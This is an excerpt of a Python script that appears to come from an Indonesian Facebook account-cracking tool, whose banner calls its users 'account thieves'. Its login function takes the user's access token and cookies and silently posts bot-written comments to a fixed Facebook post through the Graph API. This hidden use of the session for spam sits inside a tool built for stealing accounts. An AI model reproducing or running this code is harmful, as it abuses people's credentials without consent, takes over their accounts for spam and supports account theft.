...
git_hub = 'https://github.com/Skull378'
faceb0ok = 'MUHAMAD RIZKI 378'
...
###---[ANGGAP INI LOGO ]---###
def logo(n):
	return str(f""" {M}•{K}•{H}• {P}KUMPULAN PARA MALING AKUN {H}•{K}•{M}•""")
def logo2():
	return str(f"""{M}>{K}>{H}> {P}LOGIN AKUN UTAMA LUH {H}>{K}>{M}>""")
...
def login():
	...
	try:
		...
		komen = random.choice( ['Salam Dari Surabaya','Salam Dari Malang','Salam Dari Medan','Salam Dari Mojokerto','Salam Dari Solo','Salam Dari Jakarta','Salam Dari Jambi','Salam Dari Papua','Salam Dari Bali','Salam Dari Banjarmasin','Salam Dari Tegal','Salam Dari Magelang','Salam Dari Tasikmalaya','Salam Dari Cirebon','Salam Dari Bogor','Salam Dari Bengkulu','Salam Dari Denpasar','Salam Dari Aceh'])
		slebew = ('\nKomentar Ditulis Oleh Bot\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
		link = ('https://graph.facebook.com/100043618273847_973373480492071/?app=fbl')
		...
		ses.post(f"https://graph.facebook.com/100043618273847_973373480492071/comments/?message={komen}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/100043618273847_973373480492071/comments/?message={komen}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/100043618273847_973373480492071/comments/?message={komen}\n{link}\n{slebew}&access_token={token}",cookies =cok)
